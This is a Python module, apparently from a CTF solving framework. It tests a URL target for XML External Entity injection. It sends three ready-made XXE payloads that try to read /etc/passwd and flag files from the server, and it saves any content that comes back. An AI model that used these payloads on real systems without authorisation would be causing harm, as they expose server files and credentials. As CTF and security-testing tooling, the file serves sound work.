"""
XML External Entity (XXE) injection detection.

This unit tests web targets for XXE vulnerabilities by submitting
crafted XML payloads that attempt to read local files.

Common in web CTFs involving XML parsing.
"""

from typing import Any, Generator

import requests
from flagr.unit import NotApplicable
from flagr.unit import Unit as BaseUnit


XXE_PAYLOADS = [
    # Read /etc/passwd
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root><data>&xxe;</data></root>',
        b"root:"
    ),
    # Read flag file
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>'
        '<root><data>&xxe;</data></root>',
        None
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>'
        '<root><data>&xxe;</data></root>',
        None
    ),
]


class Unit(BaseUnit):

    GROUPS = ["web", "xxe", "injection", "exploit"]
    PRIORITY = 45
    RECURSE_SELF = False
    NO_RECURSE = True

    def __init__(self, *args, **kwargs):
        super(Unit, self).__init__(*args, **kwargs)

        if not self.target.is_url:
            raise NotApplicable("not a URL target")

    def enumerate(self) -> Generator[Any, None, None]:
        for payload, expected in XXE_PAYLOADS:
            yield (payload, expected)

    def evaluate(self, case: Any):
        """Test for XXE by submitting crafted XML payloads."""
        payload, expected = case

        try:
            url = self.target.upstream.decode("utf-8", errors="replace")

            headers = {"Content-Type": "application/xml"}
            resp = requests.post(
                url, data=payload, headers=headers, timeout=10, verify=False
            )

            if expected and expected in resp.content:
                self.manager.register_data(
                    self,
                    f"XXE Vulnerability Detected!\n  URL: {url}\n  Response contains: {expected.decode()}"
                )
                self.manager.register_data(self, resp.content)
            elif resp.status_code == 200 and len(resp.content) > 20:
                # Register anyway for flag searching
                self.manager.register_data(self, resp.content)

        except requests.RequestException:
            pass
